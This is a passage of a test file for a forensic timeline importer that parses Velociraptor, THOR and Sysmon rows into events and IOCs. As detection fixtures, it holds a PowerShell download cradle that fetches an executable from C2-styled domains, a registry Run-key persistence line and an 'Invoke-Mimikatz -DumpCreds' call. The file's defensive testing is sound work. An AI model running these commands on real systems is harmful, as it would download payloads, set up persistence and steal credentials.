      _Source: "Windows.Timeline.Prefetch.Improved",
      Executable: "CSC.EXE",
      RunCount: 6,
      ExecutablePath: "\\DEVICE\\HARDDISKVOLUME4\\WINDOWS\\MICROSOFT.NET\\FRAMEWORK64\\V4.0.30319\\CSC.EXE",
      LastRunTimes: ["2026-07-02T12:14:02Z"],
    });
    expect(csc.severity).toBe("Medium");
    expect(csc.mitreTechniques ?? []).toContain("T1027.004");

    const benign = one({
      _Source: "Windows.Forensics.Prefetch",
      Executable: "NOTEPAD.EXE",
      RunCount: 42,
      ExecutablePath: "\\DEVICE\\HARDDISKVOLUME4\\WINDOWS\\SYSTEM32\\NOTEPAD.EXE",
      LastRunTimes: ["2026-07-02T09:00:00Z"],
    });
    expect(benign.severity).toBe("Info");
  });

  it("SQLiteHunter browsing sources route to the browser mapper, not the key=value dump", () => {
    const visit = one({
      _Source: "Generic.Forensic.SQLiteHunter/Chromium Browser History_Visits",
      URL: "http://203.0.113.10/trigona.exe",
      Title: "Index of /",
      VisitTime: "2026-07-02T12:10:00Z",
      OSPath: "C:\\Users\\v\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
    });
    expect(visit.description).toContain("Visited");
    expect(visit.description).toContain("http://203.0.113.10/trigona.exe");
    expect(visit.description).toContain("Index of /");
    expect(visit.description).not.toContain("OSPath=");
    expect(visit.timestamp.slice(0, 10)).toBe("2026-07-02");

    const cached = one({
      _Source: "Generic.Forensic.SQLiteHunter/IE or Edge WebCacheV01_All Data",
      EntryURL: "https://filetransfer.io/data-package/9f2c",
      AccessedTime: "2026-07-02T12:20:00Z",
    });
    expect(cached.description).toContain("https://filetransfer.io/data-package/9f2c");
    expect(cached.description).not.toContain("EntryURL=");
  });

  it("Windows.Forensics.SAM → the account and its RID, never the password hash blob", () => {
    const created = one({
      _Source: "Windows.Forensics.SAM/Parsed",
      Key: "HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000003E9",
      ParsedV: {
        username: "svc_backup",
        fullname: "",
        comment: "",
        lmpwd_hash: "aad3b435b51404eeaad3b435b51404ee",
        ntpwd_hash: "31d6cfe0d16ae931b73c59d7e0c089c0",
      },
      ParsedF: {
        Rid: 1001,
        LoginCount: 3,
        PasswordResetDate: "2026-07-02T11:59:00Z",
        LastLoginDate: "2026-07-02T12:05:00Z",
        Flags: ["PASSWORD_NOT_REQUIRED"],
      },
      Mtime: "2026-07-02T11:58:00Z",
    });
    // A custom RID makes this a custom account, not a creation EVENT — the row carries no creation
    // time, so it must not say "created" and must not claim T1136.001. Low keeps it on the timeline.
    expect(created.description).toContain("Local account: svc_backup (RID 1001)");
    expect(created.description).not.toContain("Local account created");
    expect(created.description).toContain("password not required");
    expect(created.description).not.toContain("lmpwd_hash");
    expect(created.description).not.toContain("31d6cfe0");
    expect(created.severity).toBe("Low");
    expect(created.mitreTechniques ?? []).not.toContain("T1136.001");
    expect(created.timestamp.slice(0, 10)).toBe("2026-07-02");

    // WITH a real creation timestamp, the same account IS an account-creation finding.
    const madeDuringTheIntrusion = one({
      _Source: "Windows.Forensics.SAM/CreateTimes",
      Key: "HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000003EA",
      ParsedV: { username: "helpdesk_adm" },
      ParsedF: { Rid: 1002 },
      CreateTime: "2026-07-02T13:41:00Z",
    });
    expect(madeDuringTheIntrusion.description).toContain("Local account created: helpdesk_adm (RID 1002)");
    expect(madeDuringTheIntrusion.severity).toBe("Medium");
    expect(madeDuringTheIntrusion.mitreTechniques ?? []).toContain("T1136.001");
    expect(madeDuringTheIntrusion.timestamp.slice(0, 19)).toBe("2026-07-02T13:41:00");

    // Numeric ParsedF.Flags are SAM ACB bits, not Active Directory userAccountControl bits.
    const rawFlags = one({
      _Source: "Windows.Forensics.SAM/Parsed",
      Key: "HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000003EB",
      ParsedV: { username: "kiosk" },
      ParsedF: { Rid: 1003, Flags: 0x0214 }, // ACB_PWNOTREQ | ACB_NORMAL | ACB_PWNOEXP
    });
    expect(rawFlags.description).toContain("password not required");
    expect(rawFlags.description).toContain("password never expires");

    // The built-in Administrator exists on every host — it must not be graded as a created account.
    const builtin = one({
      _Source: "Windows.Forensics.SAM/Parsed",
      Key: "HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F4",
      ParsedV: { username: "Administrator" },
      ParsedF: { Rid: 500, LoginCount: 0 },
    });
    expect(builtin.description).toContain("Local account: Administrator (RID 500)");
    expect(builtin.severity).toBe("Info");
    expect(builtin.mitreTechniques ?? []).not.toContain("T1136.001");
  });

  it("LNK → Shortcut to the target path, not the nested LNK structure", () => {
    const e = one({
      _Source: "Windows.Forensics.Lnk",
      SourceFile: { OSPath: "C:\\Users\\v\\Recent\\hosts.lnk" },
      ShellLinkHeader: { Headersize: 76 },
      StringData: { TargetPath: "C:\\Windows\\System32\\drivers\\etc\\hosts" },
    });
    expect(e.description).toContain("Shortcut");
    expect(e.description).toContain("C:\\Windows\\System32\\drivers\\etc\\hosts");
  });
});

describe("parseVelociraptorJsonProgress — streaming parse for large imports", () => {
  // A batch of distinct MFT rows (each yields >=1 event) big enough to cross several progress chunks.
  const mftRows = (n: number) =>
    Array.from({ length: n }, (_, i) => ({
      _Source: "Windows.NTFS.MFT",
      EntryNumber: i,
      OSPath: `C:/x/file_${i}.txt`,
      FileName: `file_${i}.txt`,
      Created0x10: new Date(Date.UTC(2025, 0, 1) + i * 1000).toISOString(),
      LastModified0x10: new Date(Date.UTC(2025, 5, 1) + i * 1000).toISOString(),
    }));

  it("produces byte-for-byte the same result as the synchronous parse", async () => {
    const json = JSON.stringify(mftRows(12000));
    const opts = { artifact: "Windows.NTFS.MFT", aggregate: true, maxEvents: 1_000_000 };
    const sync = parseVelociraptorJson(json, opts);
    const async_ = await parseVelociraptorJsonProgress(json, opts);
    expect(async_.events.length).toBe(sync.events.length);
    expect(async_.kept).toBe(sync.kept);
    expect(async_.dropped).toBe(sync.dropped);
    expect(async_.events.slice(0, 100).map((e) => e.description)).toEqual(
      sync.events.slice(0, 100).map((e) => e.description),
    );
  });

  it("reports monotonic (done, total) progress ending exactly at total", async () => {
    const json = JSON.stringify(mftRows(12000));
    const seen: Array<[number, number]> = [];
    const r = await parseVelociraptorJsonProgress(json, { artifact: "Windows.NTFS.MFT" }, (d, t) =>
      seen.push([d, t]),
    );
    expect(seen.length).toBeGreaterThan(1);
    expect(seen.every(([, t]) => t === r.total)).toBe(true); // total is stable = row count
    expect(seen.every((p, i) => i === 0 || p[0] >= seen[i - 1][0])).toBe(true); // non-decreasing
    expect(seen.at(-1)).toEqual([r.total, r.total]); // finishes at 100%
  });

  it("reports (0, 0) and returns empty for no rows", async () => {
    const seen: Array<[number, number]> = [];
    const r = await parseVelociraptorJsonProgress("[]", { artifact: "x" }, (d, t) => seen.push([d, t]));
    expect(r.events).toHaveLength(0);
    expect(seen).toEqual([[0, 0]]);
  });

  it("yields to the event loop between chunks (a timer set before the call can fire mid-parse)", async () => {
    const json = JSON.stringify(mftRows(20000));
    let timerFired = false;
    setTimeout(() => {
      timerFired = true;
    }, 0); // can only run if the parse yields
    let firedDuringParse = false;
    await parseVelociraptorJsonProgress(json, { artifact: "Windows.NTFS.MFT" }, () => {
      if (timerFired) firedDuringParse = true;
    });
    expect(firedDuringParse).toBe(true);
  });
});

// ───────────────────────────── THOR findings collected by Velociraptor ─────────────────────────────
//
// `Generic.Scanner.ThorZIP/ThorResultsJson` streams THOR's JSON-Lines log back one row per line, so a
// finding reaches this importer as a `Line` payload rather than as a THOR file. It must still be graded
// the way the native THOR importer grades it (analysis/thorImport.ts LEVEL_SEVERITY): a scan collected
// by a hunt and the same scan dropped on the import button are the same evidence and must not disagree.
//
// The grading is what splits the two timelines. Info is THOR's scan chatter — module init, "Thor
// Version", per-file progress — and belongs in the super-timeline; Alert/Warning/Notice are findings and
// must clear the default Low forensic floor into the forensic timeline.
describe("parseVelociraptorJson — THOR rows collected by a hunt", () => {
  const thorRows = (levels: string[]) =>
    JSON.stringify({
      "Generic.Scanner.ThorZIP": levels.map((level) => ({
        Line: JSON.stringify({
          time: "2026-08-18T18:21:23Z",
          hostname: "DESKTOP-OPE297N",
          level,
          module: "Filescan",
          message: `finding-${level}`,
        }),
        FlowId: "F.DA2A4A9E0J2PK.H",
        ClientId: "C.14f7b543888d1fbe",
        _OrgId: "root",
        Fqdn: "DESKTOP-OPE297N.localdomain",
      })),
    });

  const byLevel = (text: string): Record<string, string> => {
    const parsed = parseVelociraptorJson(text, { artifact: "Generic.Scanner.ThorZIP", aggregate: false });
    return Object.fromEntries(
      parsed.events.map((e) => [/finding-(\w+)/.exec(e.description)?.[1] ?? "?", e.severity]),
    );
  };

  it("grades a THOR row by THOR's own level, not the generic severity words", () => {
    expect(byLevel(thorRows(["Alert", "Warning", "Notice", "Info"]))).toEqual({
      Alert: "Critical",
      Warning: "High",
      Notice: "Medium",
      Info: "Info",
    });
  });

  // THOR opens every scan with module init, licence banners and version lines, some at Notice level.
  // They are graded exactly as THOR graded them: the analyst reconciles the case against the scanner's
  // own summary (1 Alert / 40 Warnings / 2 Notices), and a timeline that quietly re-grades two of those
  // to Info reports 0 Medium and breaks the reconciliation. Tidiness is not worth a wrong total.
  it("keeps THOR's own grade for a scan-lifecycle module", () => {
    const rows = JSON.stringify({
      "Generic.Scanner.ThorZIP": [
        { module: "Startup", message: "THOR Lite license permits non-commercial use", level: "Notice" },
        { module: "Filescan", message: "finding-Notice", level: "Notice" },
      ].map((payload) => ({
        Line: JSON.stringify({ time: "2026-08-18T18:21:23Z", hostname: "H1", scanid: "S-1", ...payload }),
        FlowId: "F.1",
        ClientId: "C.1",
        _OrgId: "root",
        Fqdn: "H1",
      })),
    });
    const parsed = parseVelociraptorJson(rows, {
      artifact: "Generic.Scanner.ThorZIP",
      aggregate: false,
    });
    expect(parsed.events.map((e) => e.severity)).toEqual(["Medium", "Medium"]);
  });

  it("returns findings most-severe first, so a cap keeps alerts over scan chatter", () => {
    const parsed = parseVelociraptorJson(thorRows(["Info", "Notice", "Alert", "Warning"]), {
      artifact: "Generic.Scanner.ThorZIP",
      aggregate: false,
    });
    expect(parsed.events.map((e) => e.severity)).toEqual(["Critical", "High", "Medium", "Info"]);
  });
});

// The unit tests above check what one row MAPS to; this checks what a set of them SURVIVES as. Mapping
// was right and the timeline still showed 2 THOR events out of 20, because correlate merges on hash
// (step 1) and path (step 2) — and every LogScan hit in one log file shares that log's path, plus the
// hash of whatever file the line happens to name. Identity now describes the finding's own subject, so
// distinct detections stay distinct.
describe("THOR log-entry findings survive correlation as separate events", () => {
  const row = (entry: string) => ({
    Line: JSON.stringify({
      scanid: "S-1",
      time: "2026-08-18T16:14:39Z",
      hostname: "DESKTOP-OPE297N",
      level: "Warning",
      module: "LogScan",
      message: "Suspicious Log Entry found",
      entry,
      file: "C:\\ProgramData\\Microsoft\\Windows Defender\\Support\\MPLog.log",
      sha256_1: "9695cf4566ddf878a69c3d419e0da4eea87b0f24261ad8e79a3a9c4a9885429c",
    }),
    FlowId: "F.1",
    ClientId: "C.1",
    Fqdn: "DESKTOP-OPE297N",
  });

  it("keeps three distinct log entries distinct, though they share a log file and a named hash", () => {
    const text = JSON.stringify({
      "Generic.Scanner.ThorZIP": [
        row("entry one: threat A"),
        row("entry two: threat B"),
        row("entry three: threat C"),
      ],
    });
    const parsed = parseVelociraptorJson(text, { artifact: "Generic.Scanner.ThorZIP" });
    expect(parsed.events).toHaveLength(3);
    const merged = correlateEvents(
      parsed.events.map((e, i) => ({ ...e, id: `e${i}`, relatedFindingIds: [], sourceScreenshots: [] })),
    );
    expect(merged).toHaveLength(3);
  });
});

// Codex review, P2. thorRowMap deliberately gives a LogScan finding no hash and no path — they describe
// the surrounding log and a file merely named in the line, and correlate merges on both. mapGeneric then
// handed them straight back through its own fallbacks (`sha256 || thor?.sha256`, and the OSPath/FilePath
// lookup), so the collapse returned by the back door. A recognised THOR row uses THOR's identity or none.
describe("a recognised THOR row does not get generic identity fields bolted back on", () => {
  it("leaves a log-entry finding without the hash and path it deliberately omitted", () => {
    const rows = JSON.stringify({
      "Generic.Scanner.ThorZIP": [
        {
          Line: JSON.stringify({
            scanid: "S-1",
            time: "2026-08-18T16:14:39Z",
            hostname: "H1",
            level: "Warning",
            module: "LogScan",
            message: "Suspicious Log Entry found",
            entry: "Engine:command line reported as threat",
            // Both of these describe context, not the entry — and both are keys mapGeneric reads.
            sha256: "9695cf4566ddf878a69c3d419e0da4eea87b0f24261ad8e79a3a9c4a9885429c",
            FilePath: "C:\\ProgramData\\Microsoft\\Windows Defender\\Support\\MPLog.log",
          }),
          FlowId: "F.1",
          ClientId: "C.1",
        },
      ],
    });
    const e = parseVelociraptorJson(rows, { artifact: "Generic.Scanner.ThorZIP", aggregate: false })
      .events[0];
    expect(e.sha256).toBeUndefined();
    expect(e.path).toBeUndefined();
  });
});

// ── PowerShell EID 4104 splits one script block across several events when the text exceeds the
// event message size limit. Every fragment shares one ScriptBlockId and carries "(N of M)". They
// are ONE compiled script, so a rule matching several fragments must produce ONE alert holding the
// whole script — not N alerts each showing a slice of it.
describe("parseVelociraptorJson — PowerShell 4104 script-block fragments", () => {
  const SBID = "9c440b78-a34f-40b3-99d6-dca98173b1ce";
  const CHUNKS = ["function Invoke-Mimi { $x = 'AAA", "BBB'; Write-Output $x }"];

  const frag = (part: number, chunk: string, rule = "PowerShell - Mimikatz"): object => ({
    _index: "artifact_detectraptor_windows_detection_evtx",
    "@timestamp": `2026-05-07T16:31:0${part}.000Z`,
    "Detection.Name": rule,
    Computer: "WS-01",
    "System.EventID.Value": 4104,
    "System.Channel": "Microsoft-Windows-PowerShell/Operational",
    "EventData.MessageNumber": part,
    "EventData.MessageTotal": CHUNKS.length,
    "EventData.ScriptBlockId": SBID,
    "EventData.ScriptBlockText": chunk,
    Message: `Creating Scriptblock text (${part} of ${CHUNKS.length}):\n${chunk}\n\nScriptBlock ID: ${SBID}`,
    "Artifact.keyword": "DetectRaptor.Windows.Detection.Evtx",
  });

  it("collapses fragments of one block into ONE alert carrying the whole script", () => {
    const rows = CHUNKS.map((c, i) => frag(i + 1, c));
    const r = parseVelociraptorJson(JSON.stringify(rows));
    expect(r.events).toHaveLength(1);
    const e = r.events[0];
    expect(e.count).toBe(2); // both source records are represented, none dropped
    expect(r.dropped).toBe(0);
    // The reassembled script is readable in full, not truncated to fragment 1.
    const full = `${e.description} ${e.message ?? ""}`;
    for (const c of CHUNKS) expect(full).toContain(c);
    expect(e.timestamp).toContain("16:31:01"); // earliest fragment anchors the event
  });

  // Reassembly is scoped PER RULE, so an alert carries the parts ITS rule matched — not the whole
  // block. The earlier contract ("both alerts carry the whole script") was withdrawn: giving two
  // rules identical text made them collapse into one alert on row shapes whose verdict never reaches
  // the aggregation key, and a lost verdict is worse than a shorter excerpt. The "N of M" note on a
  // partial join is what tells the analyst the block had more parts than this rule matched.
  it("keeps two DIFFERENT rules over the same block as two alerts, each with its own parts", () => {
    const rows = [frag(1, CHUNKS[0]), frag(2, CHUNKS[1], "PowerShell - AMSI Bypass")];
    const r = parseVelociraptorJson(JSON.stringify(rows));
    expect(r.events).toHaveLength(2); // two distinct verdicts stay two distinct alerts
    const mimikatz = r.events.find((e) => /Mimikatz/.test(e.description))!;
    const amsi = r.events.find((e) => /AMSI Bypass/.test(e.description))!;
    expect(`${mimikatz.description} ${mimikatz.message ?? ""}`).toContain(CHUNKS[0]);
    expect(`${amsi.description} ${amsi.message ?? ""}`).toContain(CHUNKS[1]);
  });

  it("leaves a single-part block as one alert with its text unchanged", () => {
    const row = { ...frag(1, "whoami"), "EventData.MessageTotal": 1 };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    expect(r.events).toHaveLength(1);
    expect(`${r.events[0].description} ${r.events[0].message ?? ""}`).not.toContain("reassembled");
  });

  // Row normalization moved OUT of the per-row dispatch and into the shared preparation pass, so a
  // real Velociraptor JSONL export — whose payload rides inside a `{ "Line": "<json>" }` wrapper —
  // must still be unwrapped exactly once on the way through.
  it("still unwraps a { Line: <json> } Velociraptor export after normalization moved", () => {
    const payload = JSON.stringify({
      Computer: "WS-01",
      "Detection.Name": "PowerShell - Mimikatz",
      "System.EventID.Value": 4104,
      "EventData.ScriptBlockId": SBID,
      "EventData.MessageNumber": 1,
      "EventData.MessageTotal": 1,
      "EventData.ScriptBlockText": "Invoke-Mimikatz -DumpCreds",
    });
    const r = parseVelociraptorJson(JSON.stringify([{ Line: payload }]));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].description).toContain("Mimikatz");
    expect(r.events[0].asset).toBe("WS-01");
  });

  it("produces the same result through the chunked async driver", async () => {
    const rows = CHUNKS.map((c, i) => frag(i + 1, c));
    const sync = parseVelociraptorJson(JSON.stringify(rows));
    const async_ = await parseVelociraptorJsonProgress(JSON.stringify(rows));
    expect(async_.events).toHaveLength(sync.events.length);
    expect(async_.events[0].description).toBe(sync.events[0].description);
  });
});

// ── A collected PowerShell script block names its C2 by DOMAIN as often as by IP. scrapeText
// extracted the URLs, IPs and hashes out of that free text but had no domain pattern, so on a real
// case (a Lunar Spider simulation) 566 IOCs came out with ZERO of type `domain`: seventeen C2
// domains sat in the script text while the ten C2 IPs beside them were extracted, and the AI summary
// concluded "no command-and-control infrastructure is confirmed". The fixture below is that shape —
// C2 domains and C2 IPs in one block, mixed with the dotted tokens Velociraptor text is full of
// (file names, a .NET framework path, a registry key, version strings) that must NOT become domains.
describe("parseVelociraptorJson — domains embedded in free text (script blocks, command lines)", () => {
  const SCRIPT = [
    "$c = New-Object System.Net.WebClient",
    "$hosts = @('winsoftwarehub.top','cdn.brutratel-c2.net','update.latrodectus-panel.com')",
    "$ips = @('185.220.101.44','45.153.240.19')",
    'foreach ($h in $hosts) { $c.DownloadFile("http://$h/api/update", "C:\\Users\\Public\\rundll32.exe") }',
    "Start-Process C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -ArgumentList 'loader.dll'",
    "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\ProgramData\\svchost.ps1",
    "# built against 10.0.22621.2506, drops beacon.dat",
  ].join("\n");

  const scriptBlockRow = (): object => ({
    _index: "artifact_detectraptor_windows_detection_evtx",
    "@timestamp": "2026-05-07T16:31:04.000Z",
    "Detection.Name": "PowerShell - Suspicious Download Cradle",
    Computer: "WS-01",
    "System.EventID.Value": 4104,
    "System.Channel": "Microsoft-Windows-PowerShell/Operational",
    "EventData.ScriptBlockId": "1f6a0d2c-4b77-4d1e-9a54-6b0f2f7a1c33",
    "EventData.MessageNumber": 1,
    "EventData.MessageTotal": 1,
    "EventData.ScriptBlockText": SCRIPT,
    Message: `Creating Scriptblock text (1 of 1):\n${SCRIPT}`,
    "Artifact.keyword": "DetectRaptor.Windows.Detection.Evtx",
  });

  const domainsOf = (): string[] =>
    parseVelociraptorJson(JSON.stringify([scriptBlockRow()]))
      .iocs.filter((i) => i.type === "domain")
      .map((i) => i.value);

  it("extracts the C2 domains named in the script block", () => {
    expect(domainsOf().sort()).toEqual([
      "cdn.brutratel-c2.net",
      "update.latrodectus-panel.com",
      "winsoftwarehub.top",
    ]);
  });

  it("still extracts the C2 IPs from the same block (no regression)", () => {
    const ips = parseVelociraptorJson(JSON.stringify([scriptBlockRow()]))
      .iocs.filter((i) => i.type === "ip")
      .map((i) => i.value);
    expect(ips).toEqual(expect.arrayContaining(["185.220.101.44", "45.153.240.19"]));
  });

  it("does not turn a file name into a domain", () => {
    const d = domainsOf();
    for (const f of ["rundll32.exe", "csc.exe", "loader.dll", "svchost.ps1", "beacon.dat"]) {
      expect(d).not.toContain(f);
    }
  });

  it("does not turn a Windows path component or a version string into a domain", () => {
    const d = domainsOf();
    expect(d).not.toContain("microsoft.net"); // C:\Windows\Microsoft.NET\… is a directory, not a domain
    expect(d.some((v) => /^\d/.test(v))).toBe(false); // 10.0.22621.2506, v4.0.30319
  });
});

// #640 — msgFingerprint used to strip EVERY digit, so two Sysmon network-connection Sigma rows that
// differed only in destination address produced an identical fingerprint, an identical aggKey, and
// therefore ONE merged event holding the first row's description. Every IP scraped from every merged
// row was then stamped with that one event id, so IOC provenance pointed an external IP at an event
// whose text named a different destination. For a network connection the destination IS the event.
describe("parseVelociraptorJson — network identifiers keep events distinct (#640)", () => {
  function sigmaNetRow(over: { tgtIp?: string; srcPort?: number; pid?: number } = {}): object {
    const { tgtIp = "203.0.113.10", srcPort = 57554, pid = 7116 } = over;
    return {
      _Source: "Windows.Sigma.Base",
      Rule: { Title: "Net Conn (Sysmon Alert)", Level: "medium" },
      Computer: "WS-01",
      Timestamp: "2026-01-01T00:00:00Z",
      Details:
        `Initiated: true ¦ Proto: tcp ¦ SrcIP: 198.51.100.154 ¦ SrcPort: ${srcPort} ` +
        `¦ TgtIP: ${tgtIp} ¦ TgtPort: 443 ¦ User: NT AUTHORITY\\SYSTEM ` +
        `¦ Proc: C:\\Windows\\System32\\svchost.exe ¦ PID: ${pid}`,
    };
  }

  it("does NOT merge two connections that differ only in destination IP", () => {
    const parsed = parseVelociraptorJson(
      JSON.stringify([sigmaNetRow({ tgtIp: "203.0.113.10" }), sigmaNetRow({ tgtIp: "203.0.113.99" })]),
    );
    expect(parsed.events).toHaveLength(2);
    const shown = parsed.events.map((e) => e.description).join(" | ");
    expect(shown).toContain("203.0.113.10");
    expect(shown).toContain("203.0.113.99");
  });

  it("links each destination IOC to an event whose text actually names it", () => {
    const parsed = parseVelociraptorJson(
      JSON.stringify([sigmaNetRow({ tgtIp: "203.0.113.10" }), sigmaNetRow({ tgtIp: "203.0.113.99" })]),
    );
    const byKey = new Map(parsed.events.map((e) => [e.aggKey, e]));
    for (const value of ["203.0.113.10", "203.0.113.99"]) {
      const found = parsed.iocs.find((i) => i.type === "ip" && i.value === value);
      expect(found?.sourceAggKeys?.length).toBe(1);
      const linked = byKey.get(found!.sourceAggKeys![0]);
      expect(`${linked?.description ?? ""} ${linked?.message ?? ""}`).toContain(value);
    }
  });

  it("does NOT merge two connections that differ only in destination domain", () => {
    const row = (host: string): object => ({
      _Source: "Windows.Sigma.Base",
      Rule: { Title: "Suspicious DNS Query", Level: "medium" },
      Computer: "WS-01",
      Timestamp: "2026-01-01T00:00:00Z",
      Details: `QueryName: ${host} ¦ QueryStatus: 0 ¦ Proc: C:\\Windows\\System32\\svchost.exe`,
    });
    const parsed = parseVelociraptorJson(
      JSON.stringify([row("evil-a.example.com"), row("evil-b.example.com")]),
    );
    expect(parsed.events).toHaveLength(2);
  });

  it("STILL merges repeats that differ only in volatile ids (port, PID)", () => {
    const parsed = parseVelociraptorJson(
      JSON.stringify([
        sigmaNetRow({ srcPort: 57554, pid: 7116 }),
        sigmaNetRow({ srcPort: 61022, pid: 9214 }),
        sigmaNetRow({ srcPort: 49800, pid: 3311 }),
      ]),
    );
    expect(parsed.events).toHaveLength(1);
    expect(parsed.events[0].count).toBe(3);
  });

  it("keeps the key bounded however many addresses a message names", () => {
    // A netstat-style dump can name dozens of peers. The addresses go through the HASH, not into
    // the key text, so the key stays short — while two dumps naming different peers still differ.
    const dump = (base: string): object => ({
      _Source: "Custom.Dump",
      Message: `connections observed: ${Array.from({ length: 60 }, (_, i) => `${base}.${i}`).join(" ")}`,
      Timestamp: "2026-01-01T00:00:00Z",
    });
    const parsed = parseVelociraptorJson(JSON.stringify([dump("203.0.113"), dump("198.51.100")]));
    expect(parsed.events).toHaveLength(2);
    for (const e of parsed.events) expect(e.aggKey!.length).toBeLessThanOrEqual(440);
  });

  // #643 — the IPv6 candidate was anchored with \b at BOTH ends, and a "::" sitting next to a
  // NUMERIC group offers no word boundary to anchor on. Those addresses were never extracted, so
  // the digit strip erased them and the two connections merged — the exact failure #640 fixed,
  // still live for one address family. Every pair below is numeric on purpose: "::a" vs "::b"
  // passed even before this fix, because the LETTERS survive the strip as words, so it proved
  // nothing about address extraction.
  it.each([
    ["leading :: , one group", "::1", "::99"],
    ["leading :: , several groups", "::dead:1", "::dead:99"],
    ["leading :: , all numeric", "::1:2:3", "::9:8:7"],
    ["trailing :: ", "1::", "9::"],
    ["compressed in the middle", "2001:db8::1", "2001:db8::99"],
    ["link-local", "fe80::1", "fe80::99"],
    ["zone id", "fe80::1%eth0", "fe80::99%eth0"],
    ["bracketed with a port", "[2001:db8::1]:443", "[2001:db8::99]:443"],
    ["fully expanded, no hex letters", "2001:0:0:0:0:0:0:1", "2001:0:0:0:0:0:0:9"],
  ])("does NOT merge two IPv6 destinations — %s", (_label, a, b) => {
    const parsed = parseVelociraptorJson(
      JSON.stringify([sigmaNetRow({ tgtIp: a }), sigmaNetRow({ tgtIp: b })]),
    );
    expect(parsed.events).toHaveLength(2);
  });

  // #646 — the candidate was bounded by "not next to a HEX digit or a colon", and a letter satisfies
  // that, so any word::word text read as an address. "::" is everywhere in ordinary telemetry:
  // PowerShell static calls, C++ and Ruby scope resolution, stack frames. Most invented tokens are
  // CONSTANT across repeats and merely noise in the fingerprint. The two shapes below are not: a
  // volatile id sitting directly against the "::" lands inside the token, so the token varies and
  // the records stop merging — the exact collapse msgFingerprint exists to perform. Only these two
  // discriminate; a case like "[Convert]::FromBase64String(1234)" merges either way, so asserting
  // it would pass against the broken code and prove nothing.
  it.each([
    ["digits directly after the ::", "handler foo::% completed"],
    ["digits directly before the ::", "handler %::foo completed"],
  ])("STILL merges repeats that differ only in a volatile id — %s", (_label, template) => {
    const row = (id: string): object => ({
      _Source: "Custom.App",
      Message: template.replace("%", id),
      Timestamp: "2026-01-01T00:00:00Z",
    });
    const parsed = parseVelociraptorJson(JSON.stringify([row("1234"), row("5678"), row("9012")]));
    expect(parsed.events).toHaveLength(1);
    expect(parsed.events[0].count).toBe(3);
  });

  // #649 — #646 bounded the candidate on [^0-9a-z:], which only knows ASCII letters and does not
  // know the underscore. Both are ordinary identifier characters, so both read as delimiters and
  // the digits beside them became an "address" — the same defect as #646, reached through a
  // character class that stops at ASCII. It bites hardest on non-English hosts, where usernames,
  // paths and script content are routinely non-ASCII.
  it.each([
    ["Latin with an accent", "handler café::% done"],
    ["Hebrew", "handler משתמש::% done"],
    ["Cyrillic", "handler пользователь::% done"],
    ["CJK", "handler 用户::% done"],
    ["Greek", "handler χρήστης::% done"],
  ])("STILL merges repeats that differ only in a volatile id — %s", (_label, template) => {
    const row = (id: string): object => ({
      _Source: "Custom.App",
      Message: template.replace("%", id),
      Timestamp: "2026-01-01T00:00:00Z",
    });
    const parsed = parseVelociraptorJson(JSON.stringify([row("1234"), row("5678"), row("9012")]));
    expect(parsed.events).toHaveLength(1);
    expect(parsed.events[0].count).toBe(3);
  });

  // The connector-punctuation trade, at the level where the analyst sees it. A bound strict enough
  // to reject "worker_::1234" also rejects "conn_::1", and nothing separates them, so connectors
  // separate and this text yields an address token that is not one. The cost is these three
  // records not merging; the alternative cost is two different destinations merging, which is the
  // defect this whole area exists to prevent. Asserted, not left implicit, so the split reads as a
  // known price rather than a regression. See networkTokens.ts for the full argument.
  it("splits on an id beside a connector — the accepted cost of never suppressing an address", () => {
    const row = (id: string): object => ({
      _Source: "Custom.App",
      Message: `handler worker_::${id} done`,
      Timestamp: "2026-01-01T00:00:00Z",
    });
    const parsed = parseVelociraptorJson(JSON.stringify([row("1234"), row("5678"), row("9012")]));
    expect(parsed.events).toHaveLength(3);
  });

  // A real address beside the same connector must survive — the half the trade is protecting.
  it.each([
    ["hex-leading", "fe80::1", "fe80::99"],
    ["colon-leading", "::1", "::99"],
  ])("keeps two destinations apart beside a connector — %s", (_label, a, b) => {
    const row = (tgt: string): object => ({
      _Source: "Custom.App",
      Message: `conn_${tgt}_closed`,
      Timestamp: "2026-01-01T00:00:00Z",
    });
    const parsed = parseVelociraptorJson(JSON.stringify([row(a), row(b)]));
    expect(parsed.events).toHaveLength(2);
  });

  // The other half of the same rule: tightening the bound until identifier text stops matching must
  // not also drop a real address that merely sits against ordinary punctuation.
  it.each(["peer=%;", "(%)", "<%>", '"%"', "ip: %, port 443", "addr|%|"])(
    "still separates two destinations written as %s",
    (wrapper) => {
      const row = (tgt: string): object => ({
        _Source: "Custom.App",
        Message: `conn ${wrapper.replace("%", tgt)} established`,
        Timestamp: "2026-01-01T00:00:00Z",
      });
      const parsed = parseVelociraptorJson(JSON.stringify([row("fe80::1"), row("fe80::99")]));
      expect(parsed.events).toHaveLength(2);
    },
  );

  // The rule is "is it a WORD or a standalone address", not "does it look like an id". A bare
  // "1234::1234" is a well-formed IPv6 literal with nothing attached, so it is treated as an
  // address and two of them are two events — the forensic-safe reading, since silently merging two
  // destinations is the failure #640 exists to prevent. Attach a word and it stops being one.
  it("treats a standalone address-shaped token as an address, an attached one as a word", () => {
    const row = (m: string): object => ({
      _Source: "Custom.App",
      Message: m,
      Timestamp: "2026-01-01T00:00:00Z",
    });
    const standalone = parseVelociraptorJson(
      JSON.stringify([row("handler 1234::1234 done"), row("handler 5678::5678 done")]),
    );
    expect(standalone.events).toHaveLength(2);
    const attached = parseVelociraptorJson(
      JSON.stringify([row("handler foo::1234 done"), row("handler foo::5678 done")]),
    );
    expect(attached.events).toHaveLength(1);
  });

  // The address forms above and these word forms are the two halves of the same boundary rule, so
  // they are pinned together: tightening the bound until the junk disappears must not also drop a
  // real address that happens to sit next to punctuation.
  it("finds a real address beside punctuation while ignoring scope-resolution text", () => {
    const row = (tgt: string): object => ({
      _Source: "Custom.App",
      Message: `[Convert]::FromBase64String($x); std::vector::at; peer=${tgt};`,
      Timestamp: "2026-01-01T00:00:00Z",
    });
